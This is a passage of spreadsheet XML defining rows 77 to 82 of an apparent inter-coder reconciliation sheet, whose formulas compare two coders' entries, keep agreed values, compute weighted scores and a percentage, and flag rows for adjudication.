      </c>
      <c r="AN77" s="11">
        <f>IF(AND(Coder1!AN77=1,Coder2!AN77=1),IF(SUMPRODUCT(--(Coder1!E77:AH77&amp;""&lt;&gt;Coder2!E77:AH77&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO77" s="11" t="n"/>
    </row>
    <row r="78">
      <c r="A78" s="11">
        <f>Coder1!A78</f>
        <v/>
      </c>
      <c r="B78" s="11">
        <f>Coder1!B78</f>
        <v/>
      </c>
      <c r="C78" s="11">
        <f>Coder1!C78</f>
        <v/>
      </c>
      <c r="D78" s="11">
        <f>Coder1!D78</f>
        <v/>
      </c>
      <c r="E78" s="14">
        <f>IF(AND(Coder1!E78&amp;""&lt;&gt;"",Coder1!E78&amp;""=Coder2!E78&amp;""),Coder1!E78,"")</f>
        <v/>
      </c>
      <c r="F78" s="14">
        <f>IF(AND(Coder1!F78&amp;""&lt;&gt;"",Coder1!F78&amp;""=Coder2!F78&amp;""),Coder1!F78,"")</f>
        <v/>
      </c>
      <c r="G78" s="14">
        <f>IF(AND(Coder1!G78&amp;""&lt;&gt;"",Coder1!G78&amp;""=Coder2!G78&amp;""),Coder1!G78,"")</f>
        <v/>
      </c>
      <c r="H78" s="14">
        <f>IF(AND(Coder1!H78&amp;""&lt;&gt;"",Coder1!H78&amp;""=Coder2!H78&amp;""),Coder1!H78,"")</f>
        <v/>
      </c>
      <c r="I78" s="14">
        <f>IF(AND(Coder1!I78&amp;""&lt;&gt;"",Coder1!I78&amp;""=Coder2!I78&amp;""),Coder1!I78,"")</f>
        <v/>
      </c>
      <c r="J78" s="14">
        <f>IF(AND(Coder1!J78&amp;""&lt;&gt;"",Coder1!J78&amp;""=Coder2!J78&amp;""),Coder1!J78,"")</f>
        <v/>
      </c>
      <c r="K78" s="14">
        <f>IF(AND(Coder1!K78&amp;""&lt;&gt;"",Coder1!K78&amp;""=Coder2!K78&amp;""),Coder1!K78,"")</f>
        <v/>
      </c>
      <c r="L78" s="14">
        <f>IF(AND(Coder1!L78&amp;""&lt;&gt;"",Coder1!L78&amp;""=Coder2!L78&amp;""),Coder1!L78,"")</f>
        <v/>
      </c>
      <c r="M78" s="14">
        <f>IF(AND(Coder1!M78&amp;""&lt;&gt;"",Coder1!M78&amp;""=Coder2!M78&amp;""),Coder1!M78,"")</f>
        <v/>
      </c>
      <c r="N78" s="14">
        <f>IF(AND(Coder1!N78&amp;""&lt;&gt;"",Coder1!N78&amp;""=Coder2!N78&amp;""),Coder1!N78,"")</f>
        <v/>
      </c>
      <c r="O78" s="14">
        <f>IF(AND(Coder1!O78&amp;""&lt;&gt;"",Coder1!O78&amp;""=Coder2!O78&amp;""),Coder1!O78,"")</f>
        <v/>
      </c>
      <c r="P78" s="14">
        <f>IF(AND(Coder1!P78&amp;""&lt;&gt;"",Coder1!P78&amp;""=Coder2!P78&amp;""),Coder1!P78,"")</f>
        <v/>
      </c>
      <c r="Q78" s="14">
        <f>IF(AND(Coder1!Q78&amp;""&lt;&gt;"",Coder1!Q78&amp;""=Coder2!Q78&amp;""),Coder1!Q78,"")</f>
        <v/>
      </c>
      <c r="R78" s="14">
        <f>IF(AND(Coder1!R78&amp;""&lt;&gt;"",Coder1!R78&amp;""=Coder2!R78&amp;""),Coder1!R78,"")</f>
        <v/>
      </c>
      <c r="S78" s="14">
        <f>IF(AND(Coder1!S78&amp;""&lt;&gt;"",Coder1!S78&amp;""=Coder2!S78&amp;""),Coder1!S78,"")</f>
        <v/>
      </c>
      <c r="T78" s="14">
        <f>IF(AND(Coder1!T78&amp;""&lt;&gt;"",Coder1!T78&amp;""=Coder2!T78&amp;""),Coder1!T78,"")</f>
        <v/>
      </c>
      <c r="U78" s="14">
        <f>IF(AND(Coder1!U78&amp;""&lt;&gt;"",Coder1!U78&amp;""=Coder2!U78&amp;""),Coder1!U78,"")</f>
        <v/>
      </c>
      <c r="V78" s="14">
        <f>IF(AND(Coder1!V78&amp;""&lt;&gt;"",Coder1!V78&amp;""=Coder2!V78&amp;""),Coder1!V78,"")</f>
        <v/>
      </c>
      <c r="W78" s="14">
        <f>IF(AND(Coder1!W78&amp;""&lt;&gt;"",Coder1!W78&amp;""=Coder2!W78&amp;""),Coder1!W78,"")</f>
        <v/>
      </c>
      <c r="X78" s="14">
        <f>IF(AND(Coder1!X78&amp;""&lt;&gt;"",Coder1!X78&amp;""=Coder2!X78&amp;""),Coder1!X78,"")</f>
        <v/>
      </c>
      <c r="Y78" s="14">
        <f>IF(AND(Coder1!Y78&amp;""&lt;&gt;"",Coder1!Y78&amp;""=Coder2!Y78&amp;""),Coder1!Y78,"")</f>
        <v/>
      </c>
      <c r="Z78" s="14">
        <f>IF(AND(Coder1!Z78&amp;""&lt;&gt;"",Coder1!Z78&amp;""=Coder2!Z78&amp;""),Coder1!Z78,"")</f>
        <v/>
      </c>
      <c r="AA78" s="14">
        <f>IF(AND(Coder1!AA78&amp;""&lt;&gt;"",Coder1!AA78&amp;""=Coder2!AA78&amp;""),Coder1!AA78,"")</f>
        <v/>
      </c>
      <c r="AB78" s="14">
        <f>IF(AND(Coder1!AB78&amp;""&lt;&gt;"",Coder1!AB78&amp;""=Coder2!AB78&amp;""),Coder1!AB78,"")</f>
        <v/>
      </c>
      <c r="AC78" s="14">
        <f>IF(AND(Coder1!AC78&amp;""&lt;&gt;"",Coder1!AC78&amp;""=Coder2!AC78&amp;""),Coder1!AC78,"")</f>
        <v/>
      </c>
      <c r="AD78" s="14">
        <f>IF(AND(Coder1!AD78&amp;""&lt;&gt;"",Coder1!AD78&amp;""=Coder2!AD78&amp;""),Coder1!AD78,"")</f>
        <v/>
      </c>
      <c r="AE78" s="14">
        <f>IF(AND(Coder1!AE78&amp;""&lt;&gt;"",Coder1!AE78&amp;""=Coder2!AE78&amp;""),Coder1!AE78,"")</f>
        <v/>
      </c>
      <c r="AF78" s="14">
        <f>IF(AND(Coder1!AF78&amp;""&lt;&gt;"",Coder1!AF78&amp;""=Coder2!AF78&amp;""),Coder1!AF78,"")</f>
        <v/>
      </c>
      <c r="AG78" s="14">
        <f>IF(AND(Coder1!AG78&amp;""&lt;&gt;"",Coder1!AG78&amp;""=Coder2!AG78&amp;""),Coder1!AG78,"")</f>
        <v/>
      </c>
      <c r="AH78" s="14">
        <f>IF(AND(Coder1!AH78&amp;""&lt;&gt;"",Coder1!AH78&amp;""=Coder2!AH78&amp;""),Coder1!AH78,"")</f>
        <v/>
      </c>
      <c r="AI78" s="11">
        <f>IF(COUNT(E78:L78)=0,"",SUM(E78:L78))</f>
        <v/>
      </c>
      <c r="AJ78" s="11">
        <f>IF(AI78="","",N(E78)*3+N(F78)*2+N(G78)*2+N(H78)*2+N(I78)*2+N(J78)*3+N(K78)*3+N(L78)*3)</f>
        <v/>
      </c>
      <c r="AK78" s="11">
        <f>IF(AI78="","",COUNTIF(N78:AG78,1))</f>
        <v/>
      </c>
      <c r="AL78" s="11">
        <f>IF(OR(AJ78="",AJ78=0),"",ROUND(100*(AJ78-AK78)/AJ78,1))</f>
        <v/>
      </c>
      <c r="AM78" s="11">
        <f>IF(AND(Coder1!AN78=1,Coder2!AN78=1),IF(COUNTBLANK(E78:AH78)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN78" s="11">
        <f>IF(AND(Coder1!AN78=1,Coder2!AN78=1),IF(SUMPRODUCT(--(Coder1!E78:AH78&amp;""&lt;&gt;Coder2!E78:AH78&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO78" s="11" t="n"/>
    </row>
    <row r="79">
      <c r="A79" s="11">
        <f>Coder1!A79</f>
        <v/>
      </c>
      <c r="B79" s="11">
        <f>Coder1!B79</f>
        <v/>
      </c>
      <c r="C79" s="11">
        <f>Coder1!C79</f>
        <v/>
      </c>
      <c r="D79" s="11">
        <f>Coder1!D79</f>
        <v/>
      </c>
      <c r="E79" s="14">
        <f>IF(AND(Coder1!E79&amp;""&lt;&gt;"",Coder1!E79&amp;""=Coder2!E79&amp;""),Coder1!E79,"")</f>
        <v/>
      </c>
      <c r="F79" s="14">
        <f>IF(AND(Coder1!F79&amp;""&lt;&gt;"",Coder1!F79&amp;""=Coder2!F79&amp;""),Coder1!F79,"")</f>
        <v/>
      </c>
      <c r="G79" s="14">
        <f>IF(AND(Coder1!G79&amp;""&lt;&gt;"",Coder1!G79&amp;""=Coder2!G79&amp;""),Coder1!G79,"")</f>
        <v/>
      </c>
      <c r="H79" s="14">
        <f>IF(AND(Coder1!H79&amp;""&lt;&gt;"",Coder1!H79&amp;""=Coder2!H79&amp;""),Coder1!H79,"")</f>
        <v/>
      </c>
      <c r="I79" s="14">
        <f>IF(AND(Coder1!I79&amp;""&lt;&gt;"",Coder1!I79&amp;""=Coder2!I79&amp;""),Coder1!I79,"")</f>
        <v/>
      </c>
      <c r="J79" s="14">
        <f>IF(AND(Coder1!J79&amp;""&lt;&gt;"",Coder1!J79&amp;""=Coder2!J79&amp;""),Coder1!J79,"")</f>
        <v/>
      </c>
      <c r="K79" s="14">
        <f>IF(AND(Coder1!K79&amp;""&lt;&gt;"",Coder1!K79&amp;""=Coder2!K79&amp;""),Coder1!K79,"")</f>
        <v/>
      </c>
      <c r="L79" s="14">
        <f>IF(AND(Coder1!L79&amp;""&lt;&gt;"",Coder1!L79&amp;""=Coder2!L79&amp;""),Coder1!L79,"")</f>
        <v/>
      </c>
      <c r="M79" s="14">
        <f>IF(AND(Coder1!M79&amp;""&lt;&gt;"",Coder1!M79&amp;""=Coder2!M79&amp;""),Coder1!M79,"")</f>
        <v/>
      </c>
      <c r="N79" s="14">
        <f>IF(AND(Coder1!N79&amp;""&lt;&gt;"",Coder1!N79&amp;""=Coder2!N79&amp;""),Coder1!N79,"")</f>
        <v/>
      </c>
      <c r="O79" s="14">
        <f>IF(AND(Coder1!O79&amp;""&lt;&gt;"",Coder1!O79&amp;""=Coder2!O79&amp;""),Coder1!O79,"")</f>
        <v/>
      </c>
      <c r="P79" s="14">
        <f>IF(AND(Coder1!P79&amp;""&lt;&gt;"",Coder1!P79&amp;""=Coder2!P79&amp;""),Coder1!P79,"")</f>
        <v/>
      </c>
      <c r="Q79" s="14">
        <f>IF(AND(Coder1!Q79&amp;""&lt;&gt;"",Coder1!Q79&amp;""=Coder2!Q79&amp;""),Coder1!Q79,"")</f>
        <v/>
      </c>
      <c r="R79" s="14">
        <f>IF(AND(Coder1!R79&amp;""&lt;&gt;"",Coder1!R79&amp;""=Coder2!R79&amp;""),Coder1!R79,"")</f>
        <v/>
      </c>
      <c r="S79" s="14">
        <f>IF(AND(Coder1!S79&amp;""&lt;&gt;"",Coder1!S79&amp;""=Coder2!S79&amp;""),Coder1!S79,"")</f>
        <v/>
      </c>
      <c r="T79" s="14">
        <f>IF(AND(Coder1!T79&amp;""&lt;&gt;"",Coder1!T79&amp;""=Coder2!T79&amp;""),Coder1!T79,"")</f>
        <v/>
      </c>
      <c r="U79" s="14">
        <f>IF(AND(Coder1!U79&amp;""&lt;&gt;"",Coder1!U79&amp;""=Coder2!U79&amp;""),Coder1!U79,"")</f>
        <v/>
      </c>
      <c r="V79" s="14">
        <f>IF(AND(Coder1!V79&amp;""&lt;&gt;"",Coder1!V79&amp;""=Coder2!V79&amp;""),Coder1!V79,"")</f>
        <v/>
      </c>
      <c r="W79" s="14">
        <f>IF(AND(Coder1!W79&amp;""&lt;&gt;"",Coder1!W79&amp;""=Coder2!W79&amp;""),Coder1!W79,"")</f>
        <v/>
      </c>
      <c r="X79" s="14">
        <f>IF(AND(Coder1!X79&amp;""&lt;&gt;"",Coder1!X79&amp;""=Coder2!X79&amp;""),Coder1!X79,"")</f>
        <v/>
      </c>
      <c r="Y79" s="14">
        <f>IF(AND(Coder1!Y79&amp;""&lt;&gt;"",Coder1!Y79&amp;""=Coder2!Y79&amp;""),Coder1!Y79,"")</f>
        <v/>
      </c>
      <c r="Z79" s="14">
        <f>IF(AND(Coder1!Z79&amp;""&lt;&gt;"",Coder1!Z79&amp;""=Coder2!Z79&amp;""),Coder1!Z79,"")</f>
        <v/>
      </c>
      <c r="AA79" s="14">
        <f>IF(AND(Coder1!AA79&amp;""&lt;&gt;"",Coder1!AA79&amp;""=Coder2!AA79&amp;""),Coder1!AA79,"")</f>
        <v/>
      </c>
      <c r="AB79" s="14">
        <f>IF(AND(Coder1!AB79&amp;""&lt;&gt;"",Coder1!AB79&amp;""=Coder2!AB79&amp;""),Coder1!AB79,"")</f>
        <v/>
      </c>
      <c r="AC79" s="14">
        <f>IF(AND(Coder1!AC79&amp;""&lt;&gt;"",Coder1!AC79&amp;""=Coder2!AC79&amp;""),Coder1!AC79,"")</f>
        <v/>
      </c>
      <c r="AD79" s="14">
        <f>IF(AND(Coder1!AD79&amp;""&lt;&gt;"",Coder1!AD79&amp;""=Coder2!AD79&amp;""),Coder1!AD79,"")</f>
        <v/>
      </c>
      <c r="AE79" s="14">
        <f>IF(AND(Coder1!AE79&amp;""&lt;&gt;"",Coder1!AE79&amp;""=Coder2!AE79&amp;""),Coder1!AE79,"")</f>
        <v/>
      </c>
      <c r="AF79" s="14">
        <f>IF(AND(Coder1!AF79&amp;""&lt;&gt;"",Coder1!AF79&amp;""=Coder2!AF79&amp;""),Coder1!AF79,"")</f>
        <v/>
      </c>
      <c r="AG79" s="14">
        <f>IF(AND(Coder1!AG79&amp;""&lt;&gt;"",Coder1!AG79&amp;""=Coder2!AG79&amp;""),Coder1!AG79,"")</f>
        <v/>
      </c>
      <c r="AH79" s="14">
        <f>IF(AND(Coder1!AH79&amp;""&lt;&gt;"",Coder1!AH79&amp;""=Coder2!AH79&amp;""),Coder1!AH79,"")</f>
        <v/>
      </c>
      <c r="AI79" s="11">
        <f>IF(COUNT(E79:L79)=0,"",SUM(E79:L79))</f>
        <v/>
      </c>
      <c r="AJ79" s="11">
        <f>IF(AI79="","",N(E79)*3+N(F79)*2+N(G79)*2+N(H79)*2+N(I79)*2+N(J79)*3+N(K79)*3+N(L79)*3)</f>
        <v/>
      </c>
      <c r="AK79" s="11">
        <f>IF(AI79="","",COUNTIF(N79:AG79,1))</f>
        <v/>
      </c>
      <c r="AL79" s="11">
        <f>IF(OR(AJ79="",AJ79=0),"",ROUND(100*(AJ79-AK79)/AJ79,1))</f>
        <v/>
      </c>
      <c r="AM79" s="11">
        <f>IF(AND(Coder1!AN79=1,Coder2!AN79=1),IF(COUNTBLANK(E79:AH79)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN79" s="11">
        <f>IF(AND(Coder1!AN79=1,Coder2!AN79=1),IF(SUMPRODUCT(--(Coder1!E79:AH79&amp;""&lt;&gt;Coder2!E79:AH79&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO79" s="11" t="n"/>
    </row>
    <row r="80">
      <c r="A80" s="11">
        <f>Coder1!A80</f>
        <v/>
      </c>
      <c r="B80" s="11">
        <f>Coder1!B80</f>
        <v/>
      </c>
      <c r="C80" s="11">
        <f>Coder1!C80</f>
        <v/>
      </c>
      <c r="D80" s="11">
        <f>Coder1!D80</f>
        <v/>
      </c>
      <c r="E80" s="14">
        <f>IF(AND(Coder1!E80&amp;""&lt;&gt;"",Coder1!E80&amp;""=Coder2!E80&amp;""),Coder1!E80,"")</f>
        <v/>
      </c>
      <c r="F80" s="14">
        <f>IF(AND(Coder1!F80&amp;""&lt;&gt;"",Coder1!F80&amp;""=Coder2!F80&amp;""),Coder1!F80,"")</f>
        <v/>
      </c>
      <c r="G80" s="14">
        <f>IF(AND(Coder1!G80&amp;""&lt;&gt;"",Coder1!G80&amp;""=Coder2!G80&amp;""),Coder1!G80,"")</f>
        <v/>
      </c>
      <c r="H80" s="14">
        <f>IF(AND(Coder1!H80&amp;""&lt;&gt;"",Coder1!H80&amp;""=Coder2!H80&amp;""),Coder1!H80,"")</f>
        <v/>
      </c>
      <c r="I80" s="14">
        <f>IF(AND(Coder1!I80&amp;""&lt;&gt;"",Coder1!I80&amp;""=Coder2!I80&amp;""),Coder1!I80,"")</f>
        <v/>
      </c>
      <c r="J80" s="14">
        <f>IF(AND(Coder1!J80&amp;""&lt;&gt;"",Coder1!J80&amp;""=Coder2!J80&amp;""),Coder1!J80,"")</f>
        <v/>
      </c>
      <c r="K80" s="14">
        <f>IF(AND(Coder1!K80&amp;""&lt;&gt;"",Coder1!K80&amp;""=Coder2!K80&amp;""),Coder1!K80,"")</f>
        <v/>
      </c>
      <c r="L80" s="14">
        <f>IF(AND(Coder1!L80&amp;""&lt;&gt;"",Coder1!L80&amp;""=Coder2!L80&amp;""),Coder1!L80,"")</f>
        <v/>
      </c>
      <c r="M80" s="14">
        <f>IF(AND(Coder1!M80&amp;""&lt;&gt;"",Coder1!M80&amp;""=Coder2!M80&amp;""),Coder1!M80,"")</f>
        <v/>
      </c>
      <c r="N80" s="14">
        <f>IF(AND(Coder1!N80&amp;""&lt;&gt;"",Coder1!N80&amp;""=Coder2!N80&amp;""),Coder1!N80,"")</f>
        <v/>
      </c>
      <c r="O80" s="14">
        <f>IF(AND(Coder1!O80&amp;""&lt;&gt;"",Coder1!O80&amp;""=Coder2!O80&amp;""),Coder1!O80,"")</f>
        <v/>
      </c>
      <c r="P80" s="14">
        <f>IF(AND(Coder1!P80&amp;""&lt;&gt;"",Coder1!P80&amp;""=Coder2!P80&amp;""),Coder1!P80,"")</f>
        <v/>
      </c>
      <c r="Q80" s="14">
        <f>IF(AND(Coder1!Q80&amp;""&lt;&gt;"",Coder1!Q80&amp;""=Coder2!Q80&amp;""),Coder1!Q80,"")</f>
        <v/>
      </c>
      <c r="R80" s="14">
        <f>IF(AND(Coder1!R80&amp;""&lt;&gt;"",Coder1!R80&amp;""=Coder2!R80&amp;""),Coder1!R80,"")</f>
        <v/>
      </c>
      <c r="S80" s="14">
        <f>IF(AND(Coder1!S80&amp;""&lt;&gt;"",Coder1!S80&amp;""=Coder2!S80&amp;""),Coder1!S80,"")</f>
        <v/>
      </c>
      <c r="T80" s="14">
        <f>IF(AND(Coder1!T80&amp;""&lt;&gt;"",Coder1!T80&amp;""=Coder2!T80&amp;""),Coder1!T80,"")</f>
        <v/>
      </c>
      <c r="U80" s="14">
        <f>IF(AND(Coder1!U80&amp;""&lt;&gt;"",Coder1!U80&amp;""=Coder2!U80&amp;""),Coder1!U80,"")</f>
        <v/>
      </c>
      <c r="V80" s="14">
        <f>IF(AND(Coder1!V80&amp;""&lt;&gt;"",Coder1!V80&amp;""=Coder2!V80&amp;""),Coder1!V80,"")</f>
        <v/>
      </c>
      <c r="W80" s="14">
        <f>IF(AND(Coder1!W80&amp;""&lt;&gt;"",Coder1!W80&amp;""=Coder2!W80&amp;""),Coder1!W80,"")</f>
        <v/>
      </c>
      <c r="X80" s="14">
        <f>IF(AND(Coder1!X80&amp;""&lt;&gt;"",Coder1!X80&amp;""=Coder2!X80&amp;""),Coder1!X80,"")</f>
        <v/>
      </c>
      <c r="Y80" s="14">
        <f>IF(AND(Coder1!Y80&amp;""&lt;&gt;"",Coder1!Y80&amp;""=Coder2!Y80&amp;""),Coder1!Y80,"")</f>
        <v/>
      </c>
      <c r="Z80" s="14">
        <f>IF(AND(Coder1!Z80&amp;""&lt;&gt;"",Coder1!Z80&amp;""=Coder2!Z80&amp;""),Coder1!Z80,"")</f>
        <v/>
      </c>
      <c r="AA80" s="14">
        <f>IF(AND(Coder1!AA80&amp;""&lt;&gt;"",Coder1!AA80&amp;""=Coder2!AA80&amp;""),Coder1!AA80,"")</f>
        <v/>
      </c>
      <c r="AB80" s="14">
        <f>IF(AND(Coder1!AB80&amp;""&lt;&gt;"",Coder1!AB80&amp;""=Coder2!AB80&amp;""),Coder1!AB80,"")</f>
        <v/>
      </c>
      <c r="AC80" s="14">
        <f>IF(AND(Coder1!AC80&amp;""&lt;&gt;"",Coder1!AC80&amp;""=Coder2!AC80&amp;""),Coder1!AC80,"")</f>
        <v/>
      </c>
      <c r="AD80" s="14">
        <f>IF(AND(Coder1!AD80&amp;""&lt;&gt;"",Coder1!AD80&amp;""=Coder2!AD80&amp;""),Coder1!AD80,"")</f>
        <v/>
      </c>
      <c r="AE80" s="14">
        <f>IF(AND(Coder1!AE80&amp;""&lt;&gt;"",Coder1!AE80&amp;""=Coder2!AE80&amp;""),Coder1!AE80,"")</f>
        <v/>
      </c>
      <c r="AF80" s="14">
        <f>IF(AND(Coder1!AF80&amp;""&lt;&gt;"",Coder1!AF80&amp;""=Coder2!AF80&amp;""),Coder1!AF80,"")</f>
        <v/>
      </c>
      <c r="AG80" s="14">
        <f>IF(AND(Coder1!AG80&amp;""&lt;&gt;"",Coder1!AG80&amp;""=Coder2!AG80&amp;""),Coder1!AG80,"")</f>
        <v/>
      </c>
      <c r="AH80" s="14">
        <f>IF(AND(Coder1!AH80&amp;""&lt;&gt;"",Coder1!AH80&amp;""=Coder2!AH80&amp;""),Coder1!AH80,"")</f>
        <v/>
      </c>
      <c r="AI80" s="11">
        <f>IF(COUNT(E80:L80)=0,"",SUM(E80:L80))</f>
        <v/>
      </c>
      <c r="AJ80" s="11">
        <f>IF(AI80="","",N(E80)*3+N(F80)*2+N(G80)*2+N(H80)*2+N(I80)*2+N(J80)*3+N(K80)*3+N(L80)*3)</f>
        <v/>
      </c>
      <c r="AK80" s="11">
        <f>IF(AI80="","",COUNTIF(N80:AG80,1))</f>
        <v/>
      </c>
      <c r="AL80" s="11">
        <f>IF(OR(AJ80="",AJ80=0),"",ROUND(100*(AJ80-AK80)/AJ80,1))</f>
        <v/>
      </c>
      <c r="AM80" s="11">
        <f>IF(AND(Coder1!AN80=1,Coder2!AN80=1),IF(COUNTBLANK(E80:AH80)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN80" s="11">
        <f>IF(AND(Coder1!AN80=1,Coder2!AN80=1),IF(SUMPRODUCT(--(Coder1!E80:AH80&amp;""&lt;&gt;Coder2!E80:AH80&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO80" s="11" t="n"/>
    </row>
    <row r="81">
      <c r="A81" s="11">
        <f>Coder1!A81</f>
        <v/>
      </c>
      <c r="B81" s="11">
        <f>Coder1!B81</f>
        <v/>
      </c>
      <c r="C81" s="11">
        <f>Coder1!C81</f>
        <v/>
      </c>
      <c r="D81" s="11">
        <f>Coder1!D81</f>
        <v/>
      </c>
      <c r="E81" s="14">
        <f>IF(AND(Coder1!E81&amp;""&lt;&gt;"",Coder1!E81&amp;""=Coder2!E81&amp;""),Coder1!E81,"")</f>
        <v/>
      </c>
      <c r="F81" s="14">
        <f>IF(AND(Coder1!F81&amp;""&lt;&gt;"",Coder1!F81&amp;""=Coder2!F81&amp;""),Coder1!F81,"")</f>
        <v/>
      </c>
      <c r="G81" s="14">
        <f>IF(AND(Coder1!G81&amp;""&lt;&gt;"",Coder1!G81&amp;""=Coder2!G81&amp;""),Coder1!G81,"")</f>
        <v/>
      </c>
      <c r="H81" s="14">
        <f>IF(AND(Coder1!H81&amp;""&lt;&gt;"",Coder1!H81&amp;""=Coder2!H81&amp;""),Coder1!H81,"")</f>
        <v/>
      </c>
      <c r="I81" s="14">
        <f>IF(AND(Coder1!I81&amp;""&lt;&gt;"",Coder1!I81&amp;""=Coder2!I81&amp;""),Coder1!I81,"")</f>
        <v/>
      </c>
      <c r="J81" s="14">
        <f>IF(AND(Coder1!J81&amp;""&lt;&gt;"",Coder1!J81&amp;""=Coder2!J81&amp;""),Coder1!J81,"")</f>
        <v/>
      </c>
      <c r="K81" s="14">
        <f>IF(AND(Coder1!K81&amp;""&lt;&gt;"",Coder1!K81&amp;""=Coder2!K81&amp;""),Coder1!K81,"")</f>
        <v/>
      </c>
      <c r="L81" s="14">
        <f>IF(AND(Coder1!L81&amp;""&lt;&gt;"",Coder1!L81&amp;""=Coder2!L81&amp;""),Coder1!L81,"")</f>
        <v/>
      </c>
      <c r="M81" s="14">
        <f>IF(AND(Coder1!M81&amp;""&lt;&gt;"",Coder1!M81&amp;""=Coder2!M81&amp;""),Coder1!M81,"")</f>
        <v/>
      </c>
      <c r="N81" s="14">
        <f>IF(AND(Coder1!N81&amp;""&lt;&gt;"",Coder1!N81&amp;""=Coder2!N81&amp;""),Coder1!N81,"")</f>
        <v/>
      </c>
      <c r="O81" s="14">
        <f>IF(AND(Coder1!O81&amp;""&lt;&gt;"",Coder1!O81&amp;""=Coder2!O81&amp;""),Coder1!O81,"")</f>
        <v/>
      </c>
      <c r="P81" s="14">
        <f>IF(AND(Coder1!P81&amp;""&lt;&gt;"",Coder1!P81&amp;""=Coder2!P81&amp;""),Coder1!P81,"")</f>
        <v/>
      </c>
      <c r="Q81" s="14">
        <f>IF(AND(Coder1!Q81&amp;""&lt;&gt;"",Coder1!Q81&amp;""=Coder2!Q81&amp;""),Coder1!Q81,"")</f>
        <v/>
      </c>
      <c r="R81" s="14">
        <f>IF(AND(Coder1!R81&amp;""&lt;&gt;"",Coder1!R81&amp;""=Coder2!R81&amp;""),Coder1!R81,"")</f>
        <v/>
      </c>
      <c r="S81" s="14">
        <f>IF(AND(Coder1!S81&amp;""&lt;&gt;"",Coder1!S81&amp;""=Coder2!S81&amp;""),Coder1!S81,"")</f>
        <v/>
      </c>
      <c r="T81" s="14">
        <f>IF(AND(Coder1!T81&amp;""&lt;&gt;"",Coder1!T81&amp;""=Coder2!T81&amp;""),Coder1!T81,"")</f>
        <v/>
      </c>
      <c r="U81" s="14">
        <f>IF(AND(Coder1!U81&amp;""&lt;&gt;"",Coder1!U81&amp;""=Coder2!U81&amp;""),Coder1!U81,"")</f>
        <v/>
      </c>
      <c r="V81" s="14">
        <f>IF(AND(Coder1!V81&amp;""&lt;&gt;"",Coder1!V81&amp;""=Coder2!V81&amp;""),Coder1!V81,"")</f>
        <v/>
      </c>
      <c r="W81" s="14">
        <f>IF(AND(Coder1!W81&amp;""&lt;&gt;"",Coder1!W81&amp;""=Coder2!W81&amp;""),Coder1!W81,"")</f>
        <v/>
      </c>
      <c r="X81" s="14">
        <f>IF(AND(Coder1!X81&amp;""&lt;&gt;"",Coder1!X81&amp;""=Coder2!X81&amp;""),Coder1!X81,"")</f>
        <v/>
      </c>
      <c r="Y81" s="14">
        <f>IF(AND(Coder1!Y81&amp;""&lt;&gt;"",Coder1!Y81&amp;""=Coder2!Y81&amp;""),Coder1!Y81,"")</f>
        <v/>
      </c>
      <c r="Z81" s="14">
        <f>IF(AND(Coder1!Z81&amp;""&lt;&gt;"",Coder1!Z81&amp;""=Coder2!Z81&amp;""),Coder1!Z81,"")</f>
        <v/>
      </c>
      <c r="AA81" s="14">
        <f>IF(AND(Coder1!AA81&amp;""&lt;&gt;"",Coder1!AA81&amp;""=Coder2!AA81&amp;""),Coder1!AA81,"")</f>
        <v/>
      </c>
      <c r="AB81" s="14">
        <f>IF(AND(Coder1!AB81&amp;""&lt;&gt;"",Coder1!AB81&amp;""=Coder2!AB81&amp;""),Coder1!AB81,"")</f>
        <v/>
      </c>
      <c r="AC81" s="14">
        <f>IF(AND(Coder1!AC81&amp;""&lt;&gt;"",Coder1!AC81&amp;""=Coder2!AC81&amp;""),Coder1!AC81,"")</f>
        <v/>
      </c>
      <c r="AD81" s="14">
        <f>IF(AND(Coder1!AD81&amp;""&lt;&gt;"",Coder1!AD81&amp;""=Coder2!AD81&amp;""),Coder1!AD81,"")</f>
        <v/>
      </c>
      <c r="AE81" s="14">
        <f>IF(AND(Coder1!AE81&amp;""&lt;&gt;"",Coder1!AE81&amp;""=Coder2!AE81&amp;""),Coder1!AE81,"")</f>
        <v/>
      </c>
      <c r="AF81" s="14">
        <f>IF(AND(Coder1!AF81&amp;""&lt;&gt;"",Coder1!AF81&amp;""=Coder2!AF81&amp;""),Coder1!AF81,"")</f>
        <v/>
      </c>
      <c r="AG81" s="14">
        <f>IF(AND(Coder1!AG81&amp;""&lt;&gt;"",Coder1!AG81&amp;""=Coder2!AG81&amp;""),Coder1!AG81,"")</f>
        <v/>
      </c>
      <c r="AH81" s="14">
        <f>IF(AND(Coder1!AH81&amp;""&lt;&gt;"",Coder1!AH81&amp;""=Coder2!AH81&amp;""),Coder1!AH81,"")</f>
        <v/>
      </c>
      <c r="AI81" s="11">
        <f>IF(COUNT(E81:L81)=0,"",SUM(E81:L81))</f>
        <v/>
      </c>
      <c r="AJ81" s="11">
        <f>IF(AI81="","",N(E81)*3+N(F81)*2+N(G81)*2+N(H81)*2+N(I81)*2+N(J81)*3+N(K81)*3+N(L81)*3)</f>
        <v/>
      </c>
      <c r="AK81" s="11">
        <f>IF(AI81="","",COUNTIF(N81:AG81,1))</f>
        <v/>
      </c>
      <c r="AL81" s="11">
        <f>IF(OR(AJ81="",AJ81=0),"",ROUND(100*(AJ81-AK81)/AJ81,1))</f>
        <v/>
      </c>
      <c r="AM81" s="11">
        <f>IF(AND(Coder1!AN81=1,Coder2!AN81=1),IF(COUNTBLANK(E81:AH81)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN81" s="11">
        <f>IF(AND(Coder1!AN81=1,Coder2!AN81=1),IF(SUMPRODUCT(--(Coder1!E81:AH81&amp;""&lt;&gt;Coder2!E81:AH81&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO81" s="11" t="n"/>
    </row>
    <row r="82">
      <c r="A82" s="11">
        <f>Coder1!A82</f>
        <v/>
      </c>
      <c r="B82" s="11">
        <f>Coder1!B82</f>
        <v/>
      </c>
      <c r="C82" s="11">
        <f>Coder1!C82</f>
        <v/>
      </c>
      <c r="D82" s="11">
        <f>Coder1!D82</f>
        <v/>
      </c>
      <c r="E82" s="14">
